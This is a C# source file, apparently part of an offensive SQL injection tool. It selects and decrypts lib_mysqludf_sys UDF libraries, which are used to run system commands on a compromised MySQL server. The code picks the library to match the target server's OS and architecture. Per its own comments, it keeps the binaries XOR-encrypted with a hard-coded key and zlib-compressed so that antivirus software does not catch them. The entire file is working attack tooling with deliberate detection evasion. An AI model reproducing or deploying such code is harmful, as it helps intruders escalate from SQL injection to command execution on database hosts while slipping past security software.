using System;
using System.IO;
using System.IO.Compression;
using System.Text;

namespace SuperSQLInjectionV2.Tools.UdfTool
{
    /// <summary>
    /// MySQL UDF（lib_mysqludf_sys）支持：混淆格式的运行时解密与二进制选择。
    /// 库文件以cloak格式（xor+zlib）存放在config/udf/mysql下，避免杀毒软件查杀，运行时解密到内存使用。
    /// </summary>
    public static class MySqlUdfSupport
    {
        //cloak 固定密钥
        private static readonly byte[] CloakKey = Encoding.ASCII.GetBytes("ZCuk6GdHSj4KtgDq");

        public static string BaseDir => Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "config", "udf", "mysql");

        public static bool IsAvailable()
        {
            return File.Exists(Path.Combine(BaseDir, "linux", "64", "lib_mysqludf_sys.so_"))
                && File.Exists(Path.Combine(BaseDir, "windows", "64", "lib_mysqludf_sys.dll_"));
        }

        /// <summary>
        /// 按目标平台（@@version_compile_os / @@version_compile_machine）选择UDF二进制并解密
        /// </summary>
        /// <param name="libExt">库文件扩展名（.so/.dll）</param>
        public static byte[] LoadUdfBinary(string versionCompileOs, string versionCompileMachine, out string libExt)
        {
            bool isWindows = (versionCompileOs ?? "").Contains("win", StringComparison.OrdinalIgnoreCase);
            bool is64 = (versionCompileMachine ?? "").Contains("64", StringComparison.OrdinalIgnoreCase)
                     || (versionCompileOs ?? "").Contains("64", StringComparison.OrdinalIgnoreCase);
            string osDir = isWindows ? "windows" : "linux";
            libExt = isWindows ? ".dll" : ".so";
            string fileName = isWindows ? "lib_mysqludf_sys.dll_" : "lib_mysqludf_sys.so_";
            string archDir = is64 ? "64" : "32";
            string path = Path.Combine(BaseDir, osDir, archDir, fileName);
            if (!File.Exists(path))
            {
                //对应架构缺失时回退到64位
                path = Path.Combine(BaseDir, osDir, "64", fileName);
            }
            if (!File.Exists(path))
            {
                throw new FileNotFoundException("UDF库文件缺失：" + path);
            }
            return Decloak(File.ReadAllBytes(path));
        }

        /// <summary>
        /// cloak 解密：xor(KEY) + zlib解压
        /// </summary>
        public static byte[] Decloak(byte[] data)
        {
            byte[] xored = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                xored[i] = (byte)(data[i] ^ CloakKey[i % CloakKey.Length]);
            }
            using MemoryStream input = new MemoryStream(xored);
            using ZLibStream zlib = new ZLibStream(input, CompressionMode.Decompress);
            using MemoryStream output = new MemoryStream();
            zlib.CopyTo(output);
            return output.ToArray();
        }
    }
}
